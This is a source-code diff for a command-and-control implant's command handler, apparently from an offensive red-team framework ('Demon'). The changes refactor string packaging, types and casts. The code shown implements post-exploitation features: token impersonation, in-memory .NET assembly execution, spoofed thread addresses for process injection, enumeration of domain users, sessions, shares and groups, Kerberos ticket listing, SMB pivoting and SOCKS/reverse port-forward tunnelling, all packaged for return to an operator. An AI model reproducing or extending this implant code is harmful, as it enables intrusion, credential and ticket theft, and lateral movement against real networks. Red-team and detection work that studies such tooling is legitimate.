                     if (TokenList[ i ].impersonation_available)
                     {
-                        PackageAddBytes( Package, TokenList[ i ].username, StringLengthA( TokenList[ i ].username ) );
+                        PackageAddString( Package, TokenList[ i ].username );
                         PackageAddInt32( Package, TokenList[ i ].dwProcessID );
-                        PackageAddInt32( Package, TokenList[ i ].localHandle );
+                        PackageAddInt32( Package, ( DWORD ) ( ULONG_PTR ) TokenList[ i ].localHandle );
                     }
                 }
             }
@@ -1603,19 +1597,19 @@ VOID CommandAssemblyInlineExecute( PPARSER Parser )
         Instance.Dotnet->Invoked   = FALSE;
 
         /* Parse Pipe Name */
-        Buffer.Buffer = ParserGetBytes( Parser, &Buffer.Length );
+        Buffer.Buffer = ParserGetWString( Parser, &Buffer.Length );
         Instance.Dotnet->PipeName.Buffer = NtHeapAlloc( Buffer.Length + sizeof( WCHAR ) );
         Instance.Dotnet->PipeName.Length = Buffer.Length;
         MemCopy( Instance.Dotnet->PipeName.Buffer, Buffer.Buffer, Instance.Dotnet->PipeName.Length );
 
         /* Parse AppDomain Name */
-        Buffer.Buffer = ParserGetBytes( Parser, &Buffer.Length );
+        Buffer.Buffer = ParserGetWString( Parser, &Buffer.Length );
         Instance.Dotnet->AppDomainName.Buffer = NtHeapAlloc( Buffer.Length + sizeof( WCHAR ) );
         Instance.Dotnet->AppDomainName.Length = Buffer.Length;
         MemCopy( Instance.Dotnet->AppDomainName.Buffer, Buffer.Buffer, Instance.Dotnet->AppDomainName.Length );
 
         /* Parse Net Version */
-        Buffer.Buffer = ParserGetBytes( Parser, &Buffer.Length );
+        Buffer.Buffer = ParserGetWString( Parser, &Buffer.Length );
         Instance.Dotnet->NetVersion.Buffer = NtHeapAlloc( Buffer.Length + sizeof( WCHAR ) );
         Instance.Dotnet->NetVersion.Length = Buffer.Length;
         MemCopy( Instance.Dotnet->NetVersion.Buffer, Buffer.Buffer, Instance.Dotnet->NetVersion.Length );
@@ -1641,7 +1635,7 @@ VOID CommandAssemblyInlineExecute( PPARSER Parser )
         }
 
         /* Parse Argument */
-        AssemblyArgs.Buffer = ParserGetBytes( Parser, &Buffer.Length );
+        AssemblyArgs.Buffer = ParserGetWString( Parser, &Buffer.Length );
 
         PRINTF(
             "Parsed Arguments:         \n"
@@ -1674,14 +1668,14 @@ VOID CommandAssemblyInlineExecute( PPARSER Parser )
     }
 }
 
-VOID CommandAssemblyListVersion( VOID )
+VOID CommandAssemblyListVersion( PPARSER Parser )
 {
     PPACKAGE         Package      = PackageCreate( DEMON_COMMAND_ASSEMBLY_VERSIONS );
     PICLRMetaHost    pClrMetaHost = { NULL };
     PIEnumUnknown    pEnumClr     = { NULL };
     PICLRRuntimeInfo pRunTimeInfo = { NULL };
 
-    if ( Instance.Win32.CLRCreateInstance( &xCLSID_CLRMetaHost, &xIID_ICLRMetaHost, &pClrMetaHost ) == S_OK )
+    if ( Instance.Win32.CLRCreateInstance( &xCLSID_CLRMetaHost, &xIID_ICLRMetaHost, (LPVOID*)&pClrMetaHost ) == S_OK )
     {
         if ( ( pClrMetaHost )->lpVtbl->EnumerateInstalledRuntimes( pClrMetaHost, &pEnumClr ) == S_OK )
         {
@@ -1693,23 +1687,23 @@ VOID CommandAssemblyListVersion( VOID )
 
                 if ( pEnumClr->lpVtbl->Next( pEnumClr, 1, &UPTR, &fetched ) == S_OK )
                 {
-                    pRunTimeInfo = ( ICLRRuntimeInfo* ) { UPTR };
+                    pRunTimeInfo = ( PICLRRuntimeInfo ) UPTR;
                     if ( pRunTimeInfo->lpVtbl->GetVersionString( pRunTimeInfo, NULL, &dwStringSize ) == HRESULT_FROM_WIN32( ERROR_INSUFFICIENT_BUFFER ) && dwStringSize > 0 )
                     {
                         LPVOID Version = Instance.Win32.LocalAlloc( LPTR, dwStringSize );
 
                         if ( pRunTimeInfo->lpVtbl->GetVersionString( pRunTimeInfo, Version, &dwStringSize ) == S_OK )
                         {
-                            dwStringSize = WCharStringToCharString( ( PCHAR ) Version, Version, dwStringSize * 2 );
-                            PRINTF( "Version[ %d ]: %s\n", dwStringSize, Version );
-                            PackageAddBytes( Package, Version, dwStringSize );
+                            PRINTF( "Version[ %d ]: %ls\n", dwStringSize, Version );
+                            PackageAddWString( Package, Version );
                         }
 
                         Instance.Win32.LocalFree( Version );
                         Version = NULL;
+                        dwStringSize = 0;
                     }
                     else
-                        PUTS("Failed Got Version String")
+                        PUTS("Failed get Version String")
                 }
                 else break;
             }
@@ -1757,10 +1751,10 @@ VOID CommandConfig( PPARSER Parser )
 
         case DEMON_CONFIG_IMPLANT_SPFTHREADADDR:
         {
-            DWORD   LibSize    = 0;
-            DWORD   FuncSize   = 0;
-            PCHAR   Library    = ParserGetBytes( Parser, &LibSize );
-            PCHAR   Function   = ParserGetBytes( Parser, &FuncSize );
+            UINT32  LibSize    = 0;
+            UINT32  FuncSize   = 0;
+            PCHAR   Library    = ParserGetString( Parser, &LibSize );
+            PCHAR   Function   = ParserGetString( Parser, &FuncSize );
             UINT32  Offset     = ParserGetInt32( Parser );
             PVOID   ThreadAddr = NULL;
 
@@ -1788,8 +1782,8 @@ VOID CommandConfig( PPARSER Parser )
                 else PackageTransmitError( CALLBACK_ERROR_WIN32, ERROR_MOD_NOT_FOUND );
             }
 
-            PackageAddBytes( Package, Library, LibSize );
-            PackageAddBytes( Package, Function, FuncSize );
+            PackageAddString( Package, Library );
+            PackageAddString( Package, Function );
 
             break;
         }
@@ -1846,10 +1840,10 @@ VOID CommandConfig( PPARSER Parser )
 
         case DEMON_CONFIG_INJECTION_SPOOFADDR:
         {
-            DWORD   LibSize    = 0;
-            DWORD   FuncSize   = 0;
-            PCHAR   Library    = ParserGetBytes( Parser, &LibSize );
-            PCHAR   Function   = ParserGetBytes( Parser, &FuncSize );
+            UINT32  LibSize    = 0;
+            UINT32  FuncSize   = 0;
+            PCHAR   Library    = ParserGetString( Parser, &LibSize );
+            PCHAR   Function   = ParserGetString( Parser, &FuncSize );
             UINT32  Offset     = ParserGetInt32( Parser );
             PVOID   ThreadAddr = NULL;
 
@@ -1879,20 +1873,20 @@ VOID CommandConfig( PPARSER Parser )
                 else PackageTransmitError( CALLBACK_ERROR_WIN32, ERROR_MOD_NOT_FOUND );
             }
 
-            PackageAddBytes( Package, Library, LibSize );
-            PackageAddBytes( Package, Function, FuncSize );
+            PackageAddString( Package, Library );
+            PackageAddString( Package, Function );
 
             break;
         }
 
         case DEMON_CONFIG_INJECTION_SPAWN64:
         {
-            DWORD Size   = 0;
-            PVOID Buffer = NULL;
+            UINT32 Size   = 0;
+            PVOID  Buffer = NULL;
 
             if ( Instance.Config.Process.Spawn64 )
             {
-                MemSet( Instance.Config.Process.Spawn64, 0, StringLengthA( Instance.Config.Process.Spawn64 ) );
+                MemSet( Instance.Config.Process.Spawn64, 0, StringLengthW( Instance.Config.Process.Spawn64 ) * sizeof( WCHAR ) );
                 Instance.Win32.LocalFree( Instance.Config.Process.Spawn64 );
                 Instance.Config.Process.Spawn64 = NULL;
             }
@@ -1901,20 +1895,20 @@ VOID CommandConfig( PPARSER Parser )
             Instance.Config.Process.Spawn64 = Instance.Win32.LocalAlloc( LPTR, Size );
             MemCopy( Instance.Config.Process.Spawn64, Buffer, Size );
 
-            PRINTF( "Instance.Config.Process.Spawn64 => %s\n", Instance.Config.Process.Spawn64 );
-            PackageAddBytes( Package, Instance.Config.Process.Spawn64, Size );
+            PRINTF( "Instance.Config.Process.Spawn64 => %ls\n", Instance.Config.Process.Spawn64 );
+            PackageAddWString( Package, Instance.Config.Process.Spawn64 );
 
             break;
         }
 
         case DEMON_CONFIG_INJECTION_SPAWN32:
         {
-            DWORD Size   = 0;
-            PVOID Buffer = NULL;
+            UINT32 Size   = 0;
+            PVOID  Buffer = NULL;
 
             if ( Instance.Config.Process.Spawn86 )
             {
-                MemSet( Instance.Config.Process.Spawn86, 0, StringLengthA( Instance.Config.Process.Spawn86 ) );
+                MemSet( Instance.Config.Process.Spawn86, 0, StringLengthW( Instance.Config.Process.Spawn86 ) * sizeof( WCHAR ) );
                 Instance.Win32.LocalFree( Instance.Config.Process.Spawn86 );
                 Instance.Config.Process.Spawn86 = NULL;
             }
@@ -1923,8 +1917,8 @@ VOID CommandConfig( PPARSER Parser )
             Instance.Config.Process.Spawn86 = Instance.Win32.LocalAlloc( LPTR, Size );
             MemCopy( Instance.Config.Process.Spawn86, Buffer, Size );
 
-            PRINTF( "Instance.Config.Process.Spawn86 => %s\n", Instance.Config.Process.Spawn86 );
-            PackageAddBytes( Package, Instance.Config.Process.Spawn86, Size );
+            PRINTF( "Instance.Config.Process.Spawn86 => %ls\n", Instance.Config.Process.Spawn86 );
+            PackageAddWString( Package, Instance.Config.Process.Spawn86 );
 
             break;
         }
@@ -1962,7 +1956,7 @@ VOID CommandScreenshot( PPARSER Parser )
     PUTS( "Screenshot" )
     PPACKAGE Package = PackageCreate( DEMON_COMMAND_SCREENSHOT );
     PVOID    Image   = NULL;
-    SIZE_T   Size    = NULL;
+    SIZE_T   Size    = 0;
 
     if ( WinScreenshot( &Image, &Size ) )
     {
@@ -2009,7 +2003,7 @@ VOID CommandNet( PPARSER Parser )
                 }
             }
 
-            PackageAddBytes( Package, Domain, Length );
+            PackageAddString( Package, Domain );
 
             if ( Domain )
             {
@@ -2029,18 +2023,18 @@ VOID CommandNet( PPARSER Parser )
             DWORD               dwEntriesRead   = 0;
             DWORD               dwTotalEntries  = 0;
             DWORD               dwResumeHandle  = 0;
-            DWORD               NetStatus       = NULL;
-            DWORD               UserNameSize    = 0;
+            DWORD               NetStatus       = 0;
+            UINT32              UserNameSize    = 0;
             LPWSTR              ServerName      = NULL;
 
-            ServerName = ParserGetBytes( Parser, &UserNameSize );
+            ServerName = ParserGetWString( Parser, &UserNameSize );
 
-            PackageAddBytes( Package, ServerName, UserNameSize );
+            PackageAddWString( Package, ServerName );
 
             UserNameSize = 0;
             do
             {
-                NetStatus = Instance.Win32.NetWkstaUserEnum( ServerName, dwLevel, &UserInfo, MAX_PREFERRED_LENGTH, &dwEntriesRead, &dwTotalEntries, &dwResumeHandle );
+                NetStatus = Instance.Win32.NetWkstaUserEnum( ServerName, dwLevel, (LPBYTE*)&UserInfo, MAX_PREFERRED_LENGTH, &dwEntriesRead, &dwTotalEntries, &dwResumeHandle );
                 if ( ( NetStatus == NERR_Success ) || ( NetStatus == ERROR_MORE_DATA ) )
                 {
                     for ( INT i = 0; ( i < dwEntriesRead ); i++ )
@@ -2048,7 +2042,7 @@ VOID CommandNet( PPARSER Parser )
                         if ( UserInfo == NULL )
                             break;
 
-                        PackageAddBytes( Package, UserInfo[i].wkui0_username,  StringLengthW( UserInfo[i].wkui0_username ) * 2 );
+                        PackageAddWString( Package, UserInfo[i].wkui0_username );
                     }
                 }
                 else
@@ -2091,17 +2085,16 @@ VOID CommandNet( PPARSER Parser )
             DWORD             ResumeHandle      = 0;
             LPWSTR            ServerName        = NULL;
             DWORD             NetStatus         = 0;
-            DWORD             ClientNameSize    = 0;
-            DWORD             UserNameSize      = 0;
+            UINT32            UserNameSize      = 0;
 
-            ServerName = ParserGetBytes( Parser, &UserNameSize );
+            ServerName = ParserGetWString( Parser, &UserNameSize );
 
-            PackageAddBytes( Package, ServerName, UserNameSize );
+            PackageAddWString( Package, ServerName );
 
             UserNameSize = 0;
             do
             {
-                NetStatus = Instance.Win32.NetSessionEnum( ServerName, NULL, NULL, 10, &SessionInfo, MAX_PREFERRED_LENGTH, &EntriesRead, &TotalEntries, &ResumeHandle );
+                NetStatus = Instance.Win32.NetSessionEnum( ServerName, NULL, NULL, 10, (LPBYTE*)&SessionInfo, MAX_PREFERRED_LENGTH, &EntriesRead, &TotalEntries, &ResumeHandle );
 
                 if ( ( NetStatus == NERR_Success ) || ( NetStatus == ERROR_MORE_DATA ) )
                 {
@@ -2110,8 +2103,8 @@ VOID CommandNet( PPARSER Parser )
                         if ( SessionInfo == NULL )
                             break;
 
-                        PackageAddBytes( Package, SessionInfo[i].sesi10_username, StringLengthW( SessionInfo[i].sesi10_username ) * 2 );
-                        PackageAddBytes( Package, SessionInfo[i].sesi10_username, StringLengthW( SessionInfo[i].sesi10_username ) * 2 );
+                        PackageAddWString( Package, SessionInfo[i].sesi10_username );
+                        PackageAddWString( Package, SessionInfo[i].sesi10_username );
                         PackageAddInt32( Package, SessionInfo[i].sesi10_time );
                         PackageAddInt32( Package, SessionInfo[i].sesi10_idle_time );
                     }
@@ -2167,13 +2160,13 @@ VOID CommandNet( PPARSER Parser )
             DWORD           TotalEntries = 0;
             DWORD           Resume       = 0;
             LPWSTR          ServerName   = NULL;
-            DWORD           ServerSize   = 0;
+            UINT32          ServerSize   = 0;
 
-            ServerName = ParserGetBytes( Parser, &ServerSize );
-            PackageAddBytes( Package, ServerName, ServerSize );
+            ServerName = ParserGetWString( Parser, &ServerSize );
+            PackageAddWString( Package, ServerName );
             do
             {
-                NetStatus = Instance.Win32.NetShareEnum ( ServerName, 502, &ShareInfo, MAX_PREFERRED_LENGTH, &Entries, &TotalEntries, &Resume );
+                NetStatus = Instance.Win32.NetShareEnum( ServerName, 502, (LPBYTE*)&ShareInfo, MAX_PREFERRED_LENGTH, &Entries, &TotalEntries, &Resume );
                 if( ( NetStatus == ERROR_SUCCESS ) || ( NetStatus == ERROR_MORE_DATA ) )
                 {
 
@@ -2181,9 +2174,9 @@ VOID CommandNet( PPARSER Parser )
                     {
                         PRINTF( "%-5ls %-20ls %d %-20ls\n", ShareInfo[i].shi502_netname, ShareInfo[i].shi502_path, ShareInfo[i].shi502_permissions, ShareInfo[i].shi502_remark );
 
-                        PackageAddBytes( Package, ShareInfo[i].shi502_netname, StringLengthW( ShareInfo[i].shi502_netname ) * 2 );
-                        PackageAddBytes( Package, ShareInfo[i].shi502_path, StringLengthW( ShareInfo[i].shi502_path ) * 2 );
-                        PackageAddBytes( Package, ShareInfo[i].shi502_remark, StringLengthW( ShareInfo[i].shi502_remark ) * 2 );
+                        PackageAddWString( Package, ShareInfo[i].shi502_netname );
+                        PackageAddWString( Package, ShareInfo[i].shi502_path );
+                        PackageAddWString( Package, ShareInfo[i].shi502_remark );
                         PackageAddInt32( Package, ShareInfo[i].shi502_permissions );
                     }
 
@@ -2206,17 +2199,15 @@ VOID CommandNet( PPARSER Parser )
             DWORD               EntriesRead   = 0;
             DWORD               TotalEntries  = 0;
             DWORD               NetStatus     = 0;
-            DWORD               GroupSize     = 0;
-            WCHAR               DescSize      = { 0 };
             LPWSTR              ServerName    = NULL;
-            DWORD               ServerSize    = 0;
+            UINT32              ServerSize    = 0;
 
-            ServerName = ParserGetBytes( Parser, &ServerSize );
-            PackageAddBytes( Package, ServerName, ServerSize );
+            ServerName = ParserGetWString( Parser, &ServerSize );
+            PackageAddWString( Package, ServerName );
 
             PRINTF( "ServerName => %ls\n", ServerName );
 
-            NetStatus = Instance.Win32.NetLocalGroupEnum( ServerName, 1, &GroupInfo, MAX_PREFERRED_LENGTH, &EntriesRead, &TotalEntries, NULL );
+            NetStatus = Instance.Win32.NetLocalGroupEnum( ServerName, 1, (LPBYTE*)&GroupInfo, MAX_PREFERRED_LENGTH, &EntriesRead, &TotalEntries, NULL );
             if ( ( NetStatus == NERR_Success ) || ( NetStatus == ERROR_MORE_DATA ) )
             {
                 PUTS( "NetLocalGroupEnum => Success" )
@@ -2224,8 +2215,8 @@ VOID CommandNet( PPARSER Parser )
                 {
                     for( DWORD i = 0; i < EntriesRead; i++ )
                     {
-                        PackageAddBytes( Package, GroupInfo[ i ].lgrpi1_name,    StringLengthW( GroupInfo[ i ].lgrpi1_name ) * 2 );
-                        PackageAddBytes( Package, GroupInfo[ i ].lgrpi1_comment, StringLengthW( GroupInfo[ i ].lgrpi1_comment ) * 2 );
+                        PackageAddWString( Package, GroupInfo[ i ].lgrpi1_name );
+                        PackageAddWString( Package, GroupInfo[ i ].lgrpi1_comment );
                     }
 
                     Instance.Win32.NetApiBufferFree( GroupInfo );
@@ -2244,24 +2235,21 @@ VOID CommandNet( PPARSER Parser )
             DWORD               EntriesRead   = 0;
             DWORD               TotalEntries  = 0;
             DWORD               NetStatus     = 0;
-            DWORD               Resume        = 0;
-            DWORD               GroupSize     = 0;
-            WCHAR               DescSize      = { 0 };
             LPWSTR              ServerName    = NULL;
-            DWORD               ServerSize    = 0;
+            UINT32              ServerSize    = 0;
 
-            ServerName = ParserGetBytes( Parser, &ServerSize );
-            PackageAddBytes( Package, ServerName, ServerSize );
+            ServerName = ParserGetWString( Parser, &ServerSize );
+            PackageAddWString( Package, ServerName );
 
-            NetStatus = Instance.Win32.NetGroupEnum( ServerName, 1, &GroupInfo, -1, &EntriesRead, &TotalEntries, NULL );
+            NetStatus = Instance.Win32.NetGroupEnum( ServerName, 1, (LPBYTE*)&GroupInfo, -1, &EntriesRead, &TotalEntries, NULL );
             if ( ( NetStatus == NERR_Success ) || ( NetStatus == ERROR_MORE_DATA ) )
             {
                 if ( GroupInfo )
                 {
                     for( DWORD i = 0;i < EntriesRead; i++ )
                     {
-                        PackageAddBytes( Package, GroupInfo[ i ].lgrpi1_name, StringLengthW( GroupInfo[ i ].lgrpi1_name ) *2 );
-                        PackageAddBytes( Package,  GroupInfo[ i ].lgrpi1_comment, StringLengthW( GroupInfo[ i ].lgrpi1_comment ) *2 );
+                        PackageAddWString( Package, GroupInfo[ i ].lgrpi1_name );
+                        PackageAddWString( Package, GroupInfo[ i ].lgrpi1_comment );
                     }
                 }
 
@@ -2293,19 +2281,19 @@ VOID CommandNet( PPARSER Parser )
             DWORD          TotalEntries = 0;
             DWORD          Resume       = 0;
             LPWSTR         ServerName   = NULL;
-            DWORD          ServerSize   = 0;
+            UINT32         ServerSize   = 0;
 
-            ServerName = ParserGetBytes( Parser, &ServerSize );
-            PackageAddBytes( Package, ServerName, ServerSize );
+            ServerName = ParserGetWString( Parser, &ServerSize );
+            PackageAddWString( Package, ServerName );
 
-            NetStatus = Instance.Win32.NetUserEnum( ServerName, 0, 0, &UserInfo, MAX_PREFERRED_LENGTH, &EntriesRead, &TotalEntries, &Resume );
+            NetStatus = Instance.Win32.NetUserEnum( ServerName, 0, 0, (LPBYTE*)&UserInfo, MAX_PREFERRED_LENGTH, &EntriesRead, &TotalEntries, &Resume );
             if ( ( NetStatus == NERR_Success ) || ( NetStatus == ERROR_MORE_DATA ) )
             {
                 for ( DWORD i = 0; i < EntriesRead; i++ )
                 {
                     if ( UserInfo[ i ].usri0_name )
                     {
-                        PackageAddBytes( Package, UserInfo[ i ].usri0_name, StringLengthW( UserInfo[ i ].usri0_name ) * 2 );
+                        PackageAddWString( Package, UserInfo[ i ].usri0_name );
                         PackageAddInt32( Package, FALSE ); // TODO: fix this.
                     }
                 }
@@ -2358,7 +2346,7 @@ VOID CommandPivot( PPARSER Parser )
                     PRINTF( "Pivot List => DemonId:[%x] Named Pipe:[%ls]\n", TempList->DemonID, TempList->PipeName.Buffer )
 
                     PackageAddInt32( Package, TempList->DemonID );
-                    PackageAddBytes( Package, TempList->PipeName.Buffer, TempList->PipeName.Length );
+                    PackageAddWString( Package, TempList->PipeName.Buffer );
 
                     TempList = TempList->Next;
                 } else break;
@@ -2432,8 +2420,6 @@ VOID CommandPivot( PPARSER Parser )
             PUTS( "DEMON_PIVOT_SMB_COMMAND" )
 
             UINT32      DemonId   = ParserGetInt32( Parser );
-            INT         Written   = 0;
-            INT         Sent      = 0;
             BUFFER      Data      = { 0 };
             PPIVOT_DATA TempList  = Instance.SmbPivots;
             PPIVOT_DATA PivotData = NULL;
@@ -2643,7 +2629,7 @@ VOID CommandSocket( PPARSER Parser )
             FwdPort = ParserGetInt32( Parser );
 
             /* Create a reverse port forward socket and insert it into the linked list. */
-            Socket = SocketNew( NULL, SOCKET_TYPE_REVERSE_PORTFWD, LclAddr, NULL, LclPort, FwdAddr, FwdPort );
+            Socket = SocketNew( 0, SOCKET_TYPE_REVERSE_PORTFWD, LclAddr, NULL, LclPort, FwdAddr, FwdPort );
 
             /* if Socket is not NULL then we managed to start a socket. */
             PackageAddInt32( Package, Socket ? TRUE : FALSE );
@@ -2752,7 +2738,6 @@ VOID CommandSocket( PPARSER Parser )
         {
             DWORD  SocketID = 0;
             BUFFER Data     = { 0 };
-            DWORD  Result   = 0;
 
             /* Parse arguments */
             SocketID    = ParserGetInt32( Parser );
@@ -2791,15 +2776,14 @@ VOID CommandSocket( PPARSER Parser )
 
         case SOCKET_COMMAND_CONNECT: PUTS( "Socket::Connect" )
         {
-            DWORD ScId       = 0;
-            BYTE  ATYP       = 0;
-            LPSTR Host       = NULL;
-            INT   HostIpSize = 0;
-            PBYTE HostIp     = NULL;
-            DWORD IPv4       = 0;
-            PBYTE IPv6       = NULL;
-            INT16 Port       = 0;
-            LPSTR Domain     = NULL;
+            DWORD  ScId       = 0;
+            BYTE   ATYP       = 0;
+            UINT32 HostIpSize = 0;
+            PBYTE  HostIp     = NULL;
+            DWORD  IPv4       = 0;
+            PBYTE  IPv6       = NULL;
+            INT16  Port       = 0;
+            LPSTR  Domain     = NULL;
 
             /* parse arguments */
             ScId   = ParserGetInt32( Parser );
@@ -2851,7 +2835,7 @@ VOID CommandSocket( PPARSER Parser )
             if ( IPv4 || IPv6 )
             {
                 /* Create a socks proxy socket and insert it into the linked list. */
-                if ( ( Socket = SocketNew( NULL, SOCKET_TYPE_REVERSE_PROXY, IPv4, IPv6, Port, 0, 0 ) ) )
+                if ( ( Socket = SocketNew( 0, SOCKET_TYPE_REVERSE_PROXY, IPv4, IPv6, Port, 0, 0 ) ) )
                     Socket->ID = ScId;
 
                 PackageAddInt32( Package, Socket ? TRUE : FALSE );
@@ -2916,7 +2900,6 @@ VOID CommandSocket( PPARSER Parser )
 VOID Commandkerberos( PPARSER Parser )
 {
     PPACKAGE     Package = NULL;
-    PSOCKET_DATA Socket  = NULL;
     DWORD        Command = 0;
     HANDLE       hToken  = TokenCurrentHandle();
 
@@ -2956,7 +2939,6 @@ VOID Commandkerberos( PPARSER Parser )
         case KERBEROS_COMMAND_KLIST: PUTS("Kerberos::Klist")
         {
             DWORD Type                       = 0;
-            DWORD LuidVal                    = 0;
             PSESSION_INFORMATION Sessions    = NULL;
             PSESSION_INFORMATION SessionTmp  = NULL;
             DWORD                NumSessions = 0;
@@ -2984,19 +2966,19 @@ VOID Commandkerberos( PPARSER Parser )
             {
                 SessionTmp = Sessions->Next;
 
-                PackageAddBytes( Package, Sessions->UserName, StringLengthW( Sessions->UserName ) * 2 );
-                PackageAddBytes( Package, Sessions->Domain, StringLengthW( Sessions->Domain ) * 2 );
+                PackageAddWString( Package, Sessions->UserName );
+                PackageAddWString( Package, Sessions->Domain );
                 PackageAddInt32( Package, Sessions->LogonId.LowPart );
                 PackageAddInt32( Package, Sessions->LogonId.HighPart );
                 PackageAddInt32( Package, Sessions->Session );
-                PackageAddBytes( Package, Sessions->UserSID, StringLengthW( Sessions->UserSID ) * 2 );
+                PackageAddWString( Package, Sessions->UserSID );
                 PackageAddInt32( Package, Sessions->LogonTime.LowPart );
                 PackageAddInt32( Package, Sessions->LogonTime.HighPart );
                 PackageAddInt32( Package, Sessions->LogonType );
-                PackageAddBytes( Package, Sessions->AuthenticationPackage, StringLengthW( Sessions->AuthenticationPackage ) * 2 );
-                PackageAddBytes( Package, Sessions->LogonServer, StringLengthW( Sessions->LogonServer ) * 2 );
-                PackageAddBytes( Package, Sessions->LogonServerDNSDomain, StringLengthW( Sessions->LogonServerDNSDomain ) * 2 );
-                PackageAddBytes( Package, Sessions->Upn, StringLengthW( Sessions->Upn ) * 2 );
+                PackageAddWString( Package, Sessions->AuthenticationPackage );
+                PackageAddWString( Package, Sessions->LogonServer );
+                PackageAddWString( Package, Sessions->LogonServerDNSDomain );
+                PackageAddWString( Package, Sessions->Upn );
 
                 for ( NumTickets = 0, TicketTmp = Sessions->Tickets; TicketTmp; NumTickets++, TicketTmp = TicketTmp->Next ){}
 
@@ -3006,10 +2988,10 @@ VOID Commandkerberos( PPARSER Parser )
                 {
                     TicketTmp = Sessions->Tickets->Next;
 
-                    PackageAddBytes( Package, Sessions->Tickets->ClientName, StringLengthW( Sessions->Tickets->ClientName ) * 2 );
-                    PackageAddBytes( Package, Sessions->Tickets->ClientRealm, StringLengthW( Sessions->Tickets->ClientRealm ) * 2 );
-                    PackageAddBytes( Package, Sessions->Tickets->ServerName, StringLengthW( Sessions->Tickets->ServerName ) * 2 );
-                    PackageAddBytes( Package, Sessions->Tickets->ServerRealm, StringLengthW( Sessions->Tickets->ServerRealm ) * 2 );
+                    PackageAddWString( Package, Sessions->Tickets->ClientName );
+                    PackageAddWString( Package, Sessions->Tickets->ClientRealm );
+                    PackageAddWString( Package, Sessions->Tickets->ServerName );
+                    PackageAddWString( Package, Sessions->Tickets->ServerRealm );
                     PackageAddInt32( Package, Sessions->Tickets->StartTime.LowPart );
                     PackageAddInt32( Package, Sessions->Tickets->StartTime.HighPart );
                     PackageAddInt32( Package, Sessions->Tickets->EndTime.LowPart );
@@ -3134,7 +3116,7 @@ BOOL InWorkingHours( )
 
 BOOL ReachedKillDate()
 {
-    return Instance.Config.Transport.KillDate && GetSystemTimeAsUnixTime() >= Instance.Config.Transport.KillDate;
+    return Instance.Config.Transport.KillDate && GetEpochTime() >= Instance.Config.Transport.KillDate;
 }
 
 VOID KillDate( )
@@ -3208,7 +3190,7 @@ VOID CommandExit( PPARSER Parser )
         if ( SocketEntry->Socket )
         {
             Instance.Win32.closesocket( SocketEntry->Socket );
-            SocketEntry->Socket = NULL;
+            SocketEntry->Socket = 0;
         }
 
         MemSet( SocketEntry, 0, sizeof( SOCKET_DATA ) );
@@ -3253,10 +3235,10 @@ VOID CommandExit( PPARSER Parser )
         if ( ! SmbPivotList )
             break;
 
-            SmbPivotEntry = SmbPivotList;
-            SmbPivotList = SmbPivotList->Next;
+        SmbPivotEntry = SmbPivotList;
+        SmbPivotList = SmbPivotList->Next;
 
-            PivotRemove( SmbPivotEntry->DemonID );
+        PivotRemove( SmbPivotEntry->DemonID );
     }
 
     // stop impersonating
